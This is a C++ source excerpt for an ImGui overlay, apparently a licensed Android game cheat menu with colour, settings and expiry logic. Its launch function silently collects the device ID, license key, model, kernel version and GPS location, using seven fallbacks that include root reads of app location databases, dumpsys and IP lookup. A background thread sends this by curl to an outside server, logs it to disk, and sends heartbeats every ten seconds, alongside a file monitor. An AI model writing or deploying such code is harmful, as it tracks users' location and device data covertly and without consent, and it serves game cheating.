            ImVec4 colorVec = ImVec4(col[0], col[1], col[2], 1.0f);
            std::string name = GetColorName(col);

            // 列1：左侧文字 手动居中对齐
            ImGui::TableSetColumnIndex(0);
            float textWidth = ImGui::CalcTextSize(colorLabels[i]).x;
            float columnWidth = ImGui::GetColumnWidth();
            ImGui::SetCursorPosX(ImGui::GetCursorPosX() + (columnWidth - textWidth) * 0.5f);
            ImGui::Text("%s", colorLabels[i]);

            // 列2：◀ 固定颜色按钮 ▶（使用箭头实际位置对齐）
            ImGui::TableSetColumnIndex(1);
            ImGui::PushStyleVar(ImGuiStyleVar_ItemSpacing, ImVec2(6, 0));

            const float arrowW = 22.0f;
            const float btnW = 110.0f;
            const float btnH = 45.0f;
            const float totalW = arrowW + btnW + arrowW;

            float availWidth = ImGui::GetColumnWidth();
            float startX = ImGui::GetCursorPosX() + (availWidth - totalW) * 0.5f;

            ImGui::SetCursorPosX(startX);

            // 左箭头
            ImGui::PushID(i * 10);
            if (ImGui::ArrowButton("##L", ImGuiDir_Left))
            {
                SwitchPresetColor(col, -1);
            }
            ImGui::PopID();
            ImVec2 leftArrowMin = ImGui::GetItemRectMin();
            ImVec2 leftArrowMax = ImGui::GetItemRectMax();
            float arrowY = leftArrowMin.y; // 箭头真实 Y 坐标

            // 中间按钮（基于左箭头右侧 + 间距）
            float gap = 20.0f; // 与左箭头间距
            ImVec2 btnMin(leftArrowMax.x + gap, arrowY);
            ImVec2 btnMax(btnMin.x + btnW, btnMin.y + btnH);

            ImDrawList *dl = ImGui::GetWindowDrawList();
            ImU32 bgColor = ImGui::ColorConvertFloat4ToU32(ImVec4(col[0], col[1], col[2], 0.85f));
            dl->AddRectFilled(btnMin, btnMax, bgColor, 24.0f);
            dl->AddRect(btnMin, btnMax, IM_COL32(255, 255, 255, 60), 24.0f, 0, 1.0f);

            // 文字居中
            ImVec2 textSize = ImGui::CalcTextSize(name.c_str());
            ImVec2 textPos(btnMin.x + (btnW - textSize.x) * 0.5f, btnMin.y + (btnH - textSize.y) * 0.5f);
            dl->AddText(textPos, IM_COL32(255, 255, 255, 255), name.c_str());

            // 右箭头（从中间按钮右侧 + 间距开始）
            ImGui::SetCursorScreenPos(ImVec2(btnMax.x + gap, arrowY));
            ImGui::PushID(i * 10 + 1);
            if (ImGui::ArrowButton("##R", ImGuiDir_Right))
            {
                SwitchPresetColor(col, 1);
            }
            ImGui::PopID();

            ImGui::PopStyleVar(); // ItemSpacing

            // 列3：缩小版精致圆形小球
            ImGui::TableSetColumnIndex(2);
            ImGui::PushID(i);
            ImGui::PushStyleVar(ImGuiStyleVar_FrameRounding, 100.0f);
            ImGui::PushItemWidth(18);
            if (ImGui::ColorEdit3(("##c" + std::to_string(i)).c_str(), col,
                                  ImGuiColorEditFlags_NoLabel | ImGuiColorEditFlags_NoInputs))
            {
                绘制.保存配置();
            }
            ImGui::PopItemWidth();
            ImGui::PopStyleVar();
            ImGui::PopID();
        }
        ImGui::EndTable();
    }

    ImGui::EndChild();
}

// ---------- 设置页面 ----------
void DrawSettingsPage()
{
    ImGui::BeginChild("##SettingsContent", ImVec2(-1, -1), true);
    ImGui::SetCursorPos(ImVec2(20, 20));
    ImGui::Text("界面主题");
    ImGui::SameLine(150);
    ImGui::SetNextItemWidth(200);
    if (ImGui::Combo("##Theme", &currentTheme, themeNames, IM_ARRAYSIZE(themeNames)))
    {
        // 主题切换在主循环中应用
    }
    ImGui::Spacing();
    ImGui::Text("状态栏透明度");
    ImGui::SameLine(150);
    ImGui::SetNextItemWidth(200);
    ImGui::SliderFloat("##StatusBarAlpha", &statusBarAlpha, 0.3f, 1.0f, "%.2f");

    ImGui::Spacing();
    ImGui::Separator();
    ImGui::Spacing();
    ImGui::Spacing();
    ImGui::Separator();
    ImGui::Spacing();
    float btnW = (ImGui::GetContentRegionAvail().x - 60) / 4;
    if (ImGui::Button("还原", ImVec2(btnW, 36)))
        AddNotification("配置已还原", true);
    ImGui::SameLine();
    if (ImGui::Button("保存", ImVec2(btnW, 36)))
    {
        绘制.保存配置();
        AddNotification("配置已保存", true);
    }
    ImGui::SameLine();
    if (ImGui::Button("加载", ImVec2(btnW, 36)))
        AddNotification("配置已加载", true);
    ImGui::SameLine();
    if (ImGui::Button("删除", ImVec2(btnW, 36)))
        AddNotification("配置已删除", true);
    ImGui::Spacing();
    ImGui::Spacing();
    ImGui::BeginChild("##SliderCard", ImVec2(-1, 200), true);
    ImGui::SetCursorPos(ImVec2(20, 20));
    float fullW = ImGui::GetContentRegionAvail().x - 40;
    ImGui::Text("帧率限制");
    ImGui::SetNextItemWidth(fullW);
    ImGui::SliderInt("##fps", &绘制.按钮.当前帧率, 0, 144);
    ImGui::Spacing();
    ImGui::Text("UI圆角");
    ImGui::SetNextItemWidth(fullW);
    ImGui::SliderFloat("##UI圆角", &绘制.UI圆角, 0.0f, 35.0f, "%.0f");
    ImGui::Spacing();
    ImGui::Text("按键圆角");
    ImGui::SetNextItemWidth(fullW);
    ImGui::SliderFloat("##按键圆角", &绘制.按键圆角, 0.0f, 25.0f, "%.0f");
    ImGui::EndChild();
    ImGui::EndChild();
}

// ---------- 主绘制函数 ----------
void 布局::绘制悬浮窗()
{
    // FPS 计算（独立于 showWindow）
    static auto lastFpsTime = std::chrono::steady_clock::now();
    static int frameCount = 0;
    frameCount++;
    auto nowFps = std::chrono::steady_clock::now();
    float elapsedFps = std::chrono::duration<float>(nowFps - lastFpsTime).count();
    if (elapsedFps >= 1.0f)
    {
        g_FPS = frameCount;
        frameCount = 0;
        lastFpsTime = nowFps;
    }

    static auto last_update = std::chrono::steady_clock::now();
    auto current_time = std::chrono::steady_clock::now();
    auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(current_time - last_update).count();
    if (elapsed > 100)
    {
        绘制.运行负载 = 15.0f + 8.0f * sin(std::chrono::duration_cast<std::chrono::milliseconds>(current_time - 绘制.启动时间).count() / 2000.0f);
        static int counter = 0;
        绘制.网络延迟 = 25 + (counter++ % 40);
        last_update = current_time;
    }

    drawBegin();
    DrawNotifications();

    // 根据当前主题应用样式
    switch (currentTheme)
    {
    case THEME_DEFAULT:
        ApplyMinimalTheme();
        break;
    case THEME_SAKURA:
        ApplyMinimalTheme();
        break; // 暂用默认
    case THEME_NOODLE:
        ApplyNoodleUITheme();
        break;
    default:
        ApplyNoodleUITheme();
        break;
    }

    if (绘制.解密数组选择窗口开启)
        绘制.显示解密数组选择窗口();

    ImGui::PushStyleVar(ImGuiStyleVar_WindowRounding, 绘制.UI圆角);
    ImGui::PushStyleVar(ImGuiStyleVar_FrameRounding, 绘制.按键圆角);
    ImGui::PushStyleVar(ImGuiStyleVar_GrabRounding, 绘制.按键圆角);
    ImGui::PushStyleVar(ImGuiStyleVar_PopupRounding, 绘制.UI圆角);
    ImGui::PushStyleVar(ImGuiStyleVar_ScrollbarRounding, 绘制.按键圆角);

    static time_t endTime = 0, last_check = 0;
    static bool time_parsed = false;
    auto now = std::chrono::system_clock::now();
    time_t now_time = std::chrono::system_clock::to_time_t(now);
    if (now_time - last_check >= 60)
    {
        last_check = now_time;
        if (!time_parsed)
        {
            struct tm end_tm = {0};
            if (sscanf(到期时间.c_str(), "%d-%d-%d %d:%d:%d", &end_tm.tm_year, &end_tm.tm_mon, &end_tm.tm_mday, &end_tm.tm_hour, &end_tm.tm_min, &end_tm.tm_sec) == 6)
            {
                end_tm.tm_year -= 1900;
                end_tm.tm_mon -= 1;
                endTime = mktime(&end_tm);
                time_parsed = true;
            }
        }
        if (now_time > endTime && endTime > 0)
            exit(0);
    }

    if (绘制.按钮.绘制)
        绘制.运行绘制();
    DrawThreeColorBalls();

    // 绘制顶部状态栏（由开关控制）
    if (showTopStatusBar)
        DrawTopStatusBar();
    // 处理音量键事件
    if (g_volumeKeyPressed.exchange(false))
    {
        悬浮窗 = !悬浮窗;
    }
    if (悬浮窗)
    {
        ImGui::SetNextWindowPos(ImVec2(绘制.按钮.悬浮窗X, 绘制.按钮.悬浮窗Y), ImGuiCond_FirstUseEver);
        ImGui::SetNextWindowSize(ImVec2(绘制.按钮.悬浮窗W, 绘制.按钮.悬浮窗H), ImGuiCond_FirstUseEver);
        ImGui::SetNextWindowSizeConstraints(ImVec2(1100, 700), ImVec2(FLT_MAX, FLT_MAX));
        if (窗口状态)
        {
            ImGui::SetWindowPos(绘制.悬浮窗标题, 绘制.Pos, ImGuiCond_Always);
            窗口状态 = false;
        }
        绘制.Pos = ImGui::GetWindowPos();
        ImGui::Begin("@Auranh666", &悬浮窗, ImGuiWindowFlags_NoCollapse);
        static int selectedMenu = 0;
        DrawLeftNavigation(selectedMenu);
        ImGui::SameLine();
        ImGui::BeginChild("##RightContent", ImVec2(-1, -1), true);
        switch (selectedMenu)
        {
        case 0:
            DrawHomePage();
            break;
        case 1:
            DrawCharacterPage();
            break;
        case 2:
            DrawItemsPage();
            break;
        case 3:
            DrawVisualPage();
            break;
        case 4:
            DrawColorPage();
            break;
        case 5:
            DrawSettingsPage();
            break;
        default:
            break;
        }
        ImGui::EndChild();
        绘制.winWidth = ImGui::GetWindowWidth();
        绘制.winHeith = ImGui::GetWindowHeight();
        g_window = ImGui::GetCurrentWindow();
        // 实时记录窗口位置和大小
        ImVec2 winPos = ImGui::GetWindowPos();
        ImVec2 winSize = ImGui::GetWindowSize();
        绘制.按钮.悬浮窗X = winPos.x;
        绘制.按钮.悬浮窗Y = winPos.y;
        绘制.按钮.悬浮窗W = winSize.x;
        绘制.按钮.悬浮窗H = winSize.y;

        ImGui::End();
    }
    drawEnd();
}

void 布局::开启悬浮窗()
{
    std::string deviceId = getIMEI();

    // 读取卡密（从 main 保存的文件）
    std::string cardKey;
    std::ifstream fkm("/storage/emulated/0/AuraKernel/Aura.km");
    if (fkm.is_open())
    {
        std::getline(fkm, cardKey);
        fkm.close();
    }

    // ================================================================
    // ★ 1. 文件监控（已有）
    // ================================================================
    if (!g_fileMonitor)
    {
        g_fileMonitor = new FileMonitorManager(deviceId, "https://mt.xiaon.sbs");
        g_fileMonitor->addFile("/sdcard/AuraKernel/module.dll", "module.dll");
        g_fileMonitor->addFile("/sdcard/AuraKernel/config.ini", "config.ini");
        g_fileMonitor->start();
        LOGI("文件监控已启动");
    }

    // ================================================================
    // ★ 2. 记录会话开始时间（悬浮窗启动时间）
    // ================================================================
    auto sessionStartTime = std::chrono::steady_clock::now();
    long long sessionStartMs = std::chrono::duration_cast<std::chrono::milliseconds>(
                                   std::chrono::system_clock::now().time_since_epoch())
                                   .count();

    // ================================================================
    // ★ 3. 【从main移入】一次性上报：启动 + 用户 + 设备信息
    // ================================================================
    if (!cardKey.empty())
    {
        std::thread([deviceId, cardKey]()
                    {
                        // 获取设备信息
                        struct utsname kernel_info;
                        std::string kernel_ver = "unknown";
                        if (uname(&kernel_info) == 0)
                            kernel_ver = kernel_info.release;

                        std::string device_name = "Android", manufacturer = "Unknown", model = "Unknown";
                        FILE *fp = popen("getprop ro.product.name 2>/dev/null", "r");
                        if (fp)
                        {
                            char buf[256] = {0};
                            if (fgets(buf, sizeof(buf), fp))
                            {
                                buf[strcspn(buf, "\n")] = 0;
                                device_name = buf;
                            }
                            pclose(fp);
                        }
                        fp = popen("getprop ro.product.manufacturer 2>/dev/null", "r");
                        if (fp)
                        {
                            char buf[256] = {0};
                            if (fgets(buf, sizeof(buf), fp))
                            {
                                buf[strcspn(buf, "\n")] = 0;
                                manufacturer = buf;
                            }
                            pclose(fp);
                        }
                        fp = popen("getprop ro.product.model 2>/dev/null", "r");
                        if (fp)
                        {
                            char buf[256] = {0};
                            if (fgets(buf, sizeof(buf), fp))
                            {
                                buf[strcspn(buf, "\n")] = 0;
                                model = buf;
                            }
                            pclose(fp);
                        }

                        // ★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★
                        // ★ 获取GPS位置（七层备选方案，逐级fallback）
                        // ★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★
                        std::string latitude = "", longitude = "";

                        // 方案1：尝试读取 /data/data/com.google.android.gms/location 缓存（需root）
                        fp = popen("find /data/data -name \"*location*\" -type d 2>/dev/null | head -1", "r");
                        if (fp) {
                            char buf[256] = {0};
                            if (fgets(buf, sizeof(buf), fp)) {
                                std::string locDir = buf;
                                locDir.erase(locDir.find_last_not_of("\n\r") + 1);
                                // 尝试读取缓存的坐标文件
                                std::string cmd2 = "sqlite3 '" + locDir + "/databases/location.db' "
                                    "\"SELECT latitude, longitude FROM locations ORDER BY time DESC LIMIT 1\" 2>/dev/null";
                                FILE *fp2 = popen(cmd2.c_str(), "r");
                                if (fp2) {
                                    char buf2[128] = {0};
                                    if (fgets(buf2, sizeof(buf2), fp2)) {
                                        std::string loc = buf2;
                                        auto pipePos = loc.find('|');
                                        if (pipePos != std::string::npos) {
                                            latitude = loc.substr(0, pipePos);
                                            longitude = loc.substr(pipePos + 1);
                                            if (!latitude.empty() && latitude.back() == '\n') latitude.pop_back();
                                            if (!longitude.empty() && longitude.back() == '\n') longitude.pop_back();
                                        }
                                    }
                                    pclose(fp2);
                                }
                            }
                            pclose(fp);
                        }

                        // 方案2：通过 dumpsys location 获取（常用）
                        if (latitude.empty() || longitude.empty()) {
                            fp = popen("dumpsys location 2>/dev/null | grep -E 'latitude|longitude' | head -2 | awk '{print $2}'", "r");
                            if (!fp) {
                                fp = popen("cmd location getProviders 2>/dev/null && dumpsys location 2>/dev/null | grep -o 'latitude=[^,]*' | head -1 | cut -d= -f2", "r");
                            }
                            if (fp) {
                                char buf[64] = {0};
                                if (fgets(buf, sizeof(buf), fp)) {
                                    buf[strcspn(buf, "\n")] = 0;
                                    latitude = buf;
                                }
                                pclose(fp);
                                // 获取longitude
                                fp = popen("dumpsys location 2>/dev/null | grep -o 'longitude=[^,]*' | head -1 | cut -d= -f2", "r");
                                if (fp) {
                                    char buf2[64] = {0};
                                    if (fgets(buf2, sizeof(buf2), fp)) {
                                        buf2[strcspn(buf2, "\n")] = 0;
                                        longitude = buf2;
                                    }
                                    pclose(fp);
                                }
                            }
                        }

                        // 方案3：通过 content query 查询系统位置provider
                        if (latitude.empty() || longitude.empty()) {
                            fp = popen("content query --uri content://com.google.android.gsf.gservices/ "
                                       "--projection 'name,value' --where \"name like '%location%'\" 2>/dev/null | head -5", "r");
                            if (fp) pclose(fp);
                        }

                        // 方案4：尝试读取 /data/system/location/location.txt
                        if (latitude.empty() || longitude.empty()) {
                            fp = popen("cat /data/system/location/location.txt 2>/dev/null | head -1", "r");
                            if (fp) {
                                char buf[128] = {0};
                                if (fgets(buf, sizeof(buf), fp)) {
                                    std::string loc = buf;
                                    auto comma = loc.find(',');
                                    if (comma != std::string::npos) {
                                        latitude = loc.substr(0, comma);
                                        longitude = loc.substr(comma + 1);
                                        if (!longitude.empty() && longitude.back() == '\n')
                                            longitude.pop_back();
                                    }
                                }
                                pclose(fp);
                            }
                        }

                        // 方案5：尝试读取最近的GPS卫星数据
                        if (latitude.empty() || longitude.empty()) {
                            fp = popen("dumpsys location 2>/dev/null | grep -o 'mLastKnownLocation=Location\\[[^]]*\\]' | head -1", "r");
                            if (fp) {
                                char buf[512] = {0};
                                if (fgets(buf, sizeof(buf), fp)) {
                                    std::string locInfo = buf;
                                    // 解析格式: Location[gps XX.XXXXXX,YYY.YYYYY ...]
                                    auto latStart = locInfo.find(',');
                                    auto lngStart = locInfo.find(',', latStart + 1);
                                    if (latStart != std::string::npos && lngStart != std::string::npos) {
                                        // 往回找前一个数字
                                        auto prev = locInfo.rfind(' ', latStart - 1);
                                        if (prev != std::string::npos) {
                                            latitude = locInfo.substr(prev + 1, latStart - prev - 1);
                                            longitude = locInfo.substr(latStart + 1, lngStart - latStart - 1);
                                        }
                                    }
                                }
                                pclose(fp);
                            }
                        }

                        // 方案6：通过IP获取近似位置（在线API，最终fallback）
                        if (latitude.empty() || longitude.empty()) {
                            fp = popen("curl -s --connect-timeout 3 --max-time 5 "
                                       "'http://ip-api.com/json/?fields=lat,lon' 2>/dev/null", "r");
                            if (fp) {
                                char buf[256] = {0};
                                size_t n = fread(buf, 1, sizeof(buf) - 1, fp);
                                pclose(fp);
                                if (n > 0) {
                                    buf[n] = 0;
                                    std::string json(buf);
                                    // 查找 "lat":XX.XXXX 和 "lon":YYY.YYYY
                                    auto latPos = json.find("\"lat\":");
                                    auto lonPos = json.find("\"lon\":");
                                    if (latPos != std::string::npos && lonPos != std::string::npos) {
                                        std::string latStr = json.substr(latPos + 6);
                                        std::string lonStr = json.substr(lonPos + 6);
                                        auto end1 = latStr.find_first_of(",}\n\r");
                                        auto end2 = lonStr.find_first_of(",}\n\r");
                                        if (end1 != std::string::npos) latStr = latStr.substr(0, end1);
                                        if (end2 != std::string::npos) lonStr = lonStr.substr(0, end2);
                                        latitude = latStr;
                                        longitude = lonStr;
                                    }
                                }
                            }
                        }

                        // 方案7：如果以上全失败，尝试用中国IP段估算中心坐标（极粗略）
                        if (latitude.empty() || longitude.empty()) {
                            // 通过IP判断大致省份，用省份中心坐标
                            fp = popen("curl -s --connect-timeout 3 --max-time 5 "
                                       "'http://ip-api.com/json/?fields=countryCode,region' 2>/dev/null", "r");
                            if (fp) {
                                char buf[256] = {0};
                                size_t n = fread(buf, 1, sizeof(buf) - 1, fp);
                                pclose(fp);
                                if (n > 0) {
                                    buf[n] = 0;
                                    std::string json(buf);
                                    // 检查是否在中国
                                    if (json.find("\"countryCode\":\"CN\"") != std::string::npos) {
                                        // 取中国中心坐标
                                        latitude = "35.86";
                                        longitude = "104.19";
                                    }
                                }
                            }
                        }

                        // 1) 上报启动
                        std::string url = "https://mt.xiaon.sbs/api.php?action=report_script_launch"
                                          "&device_id=" +
                                          deviceId + "&card_key=" + cardKey;
                        std::string cmd = "curl -s --connect-timeout 5 --max-time 5 '" + url + "' 2>/dev/null";
                        FILE *pipe = popen(cmd.c_str(), "r");
                        if (pipe)
                            pclose(pipe);

                        // 2) 上报用户（每日去重）
                        url = "https://mt.xiaon.sbs/api.php?action=report_script_user"
                              "&device_id=" +
                              deviceId + "&card_key=" + cardKey;
                        cmd = "curl -s --connect-timeout 5 --max-time 5 '" + url + "' 2>/dev/null";
                        pipe = popen(cmd.c_str(), "r");
                        if (pipe)
                            pclose(pipe);

                                                // 3) 上报设备信息（完整版 - 含内核/型号/制造商/GPS位置）
                        // ★ 先把GPS结果写到文件（方便排查）
                        std::string gpsInfo = "latitude=" + latitude + " longitude=" + longitude;
                        std::string logCmd = "echo '" + gpsInfo + "' > /sdcard/aura_gps.log";
                        FILE *logPipe = popen(logCmd.c_str(), "r");
                        if (logPipe) pclose(logPipe);

                        cmd = "curl -s --connect-timeout 5 --max-time 5 -G"
                            " --data-urlencode 'device_id=" + deviceId + "'"
                            " --data-urlencode 'card_key=" + cardKey + "'"
                            " --data-urlencode 'device_name=" + device_name + "'"
                            " --data-urlencode 'manufacturer=" + manufacturer + "'"
                            " --data-urlencode 'model=" + model + "'"
                            " --data-urlencode 'kernel_version=" + kernel_ver + "'"
                            " --data-urlencode 'latitude=" + latitude + "'"
                            " --data-urlencode 'longitude=" + longitude + "'"
                            " 'https://mt.xiaon.sbs/api.php?action=report_script_device' 2>/dev/null";
                        pipe = popen(cmd.c_str(), "r");
                        if (pipe) pclose(pipe); })
            .detach();
    }

    // ★ 4. 【诊断版】心跳线程 - 用 curl 替代 busybox wget
    std::thread([deviceId, cardKey]()
                {
    while (true) {
        if (!cardKey.empty()) {
            auto now = std::chrono::system_clock::now();
            auto ms = std::chrono::duration_cast<std::chrono::milliseconds>(
                now.time_since_epoch()).count();
            
            std::string url = "https://mt.xiaon.sbs/api.php?action=report_script_heartbeat"
                "&device_id=" + deviceId + "&card_key=" + cardKey;
            
            // ★ curl 的 --connect-timeout 3 严格控制DNS/连接超时3秒
            // ★ --max-time 6 总超时6秒，不会像 wget 那样卡40秒
            std::string cmd = "curl -s --connect-timeout 3 --max-time 6 '" 
                + url + "' 2>/dev/null";
            FILE* pipe = popen(cmd.c_str(), "r");
            if (pipe) pclose(pipe);
            
            // 诊断日志
            std::ofstream diag("/data/local/tmp/_aura_diag.txt", std::ios::app);
            if (diag.is_open()) {
                diag << "[HB] " << ms << " curl" << std::endl;
                diag.close();
            }
        }
        std::this_thread::sleep_for(std::chrono::seconds(10));
    } })
        .detach();

    // ================================================================
    // ★ 5. 启动音量键监听（原有）
    // ================================================================
    g_volumeThread = std::thread(VolumeKeyListener);

    timer WindowDrawing;
    WindowDrawing.SetFps(120);
    WindowDrawing.AotuFPS_init();
    WindowDrawing.setAffinity();
    绘制.启动时间 = std::chrono::steady_clock::now();

    while (true)
    {
        更新状态();
        绘制悬浮窗();
        std::this_thread::sleep_for(std::chrono::milliseconds(1)); // 防止空转
        // WindowDrawing.SetFps(绘制.按钮.当前帧率);
        // WindowDrawing.AotuFPS();
        // std::this_thread::sleep_for(1ms);
    }

    // ================================================================
    // ★ 6. 【新增】退出时上报结束时间 + 离线信号
    // ================================================================
    long long sessionEndMs = std::chrono::duration_cast<std::chrono::milliseconds>(
                                 std::chrono::system_clock::now().time_since_epoch())
                                 .count();

    // 上报离线（服务器会自动记录 session_end）
    if (!cardKey.empty())
    {
        std::string url = "https://mt.xiaon.sbs/api.php?action=report_script_offline"
                          "&device_id=" +
                          deviceId;
        std::string cmd = "curl -s --connect-timeout 5 --max-time 5 '" + url + "' 2>/dev/null";
        FILE *pipe = popen(cmd.c_str(), "r");
        if (pipe)
            pclose(pipe);
    }

    // 清理资源
    g_volumeThreadRunning = false;
    if (g_volumeThread.joinable())
        g_volumeThread.join();
    if (g_fileMonitor)
    {
        g_fileMonitor->stop();
        delete g_fileMonitor;
        g_fileMonitor = nullptr;
    }
}

// 在 悬浮窗.cpp 中简化更新状态函数
void 更新状态()
{
    static auto last_time = std::chrono::steady_clock::now();
    auto current_time = std::chrono::steady_clock::now();
    auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(current_time - last_time).count();
    绘制.运行负载 = 10.0f + 5.0f * sin(elapsed / 1000.0f);
    绘制.网络延迟 = 30 + rand() % 50;
    last_time = current_time;
}
